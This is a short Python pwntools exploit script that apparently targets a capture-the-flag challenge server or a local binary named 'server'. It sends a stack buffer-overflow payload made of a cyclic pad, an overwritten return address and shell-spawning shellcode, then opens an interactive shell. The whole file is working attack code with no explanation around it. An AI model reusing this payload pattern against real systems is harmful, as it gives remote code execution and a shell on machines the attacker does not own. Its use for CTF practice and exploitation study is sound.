#!/usr/bin/env python2
from pwn import *

r = '' # this will contain our local proces or remote socket
argError = "Specify LOCAL or REMOTE plz..."

### CHANGE THESE ###
localProcess = 'server'
remoteHost = 'challenge.acictf.com'
remotePort = 31813
context.update(arch='i386', os='linux')
####################

if len(sys.argv) < 2:
    print argError
    sys.exit(0)

if sys.argv[1] ==  "local":
    if len(sys.argv) > 2 and sys.argv[2] == "debug":
        ### ADD ARGUMENTS TO GDB DEBUG HERE IF NECESSARY ###
        r = gdb.debug(localProcess)
    else:
        r = process(localProcess) 
elif sys.argv[1] ==  "remote":
    r = remote(remoteHost, remotePort)
else:
    print sys.argv[1]
    print argError
    sys.exit(0)

payload = "HELLO\x000\x00"
payload += cyclic(321)
payload += "\x67\x86\x04\x08"
payload += str(asm(shellcraft.sh()))
payload += "\x00"
r.sendline(payload)
r.interactive()
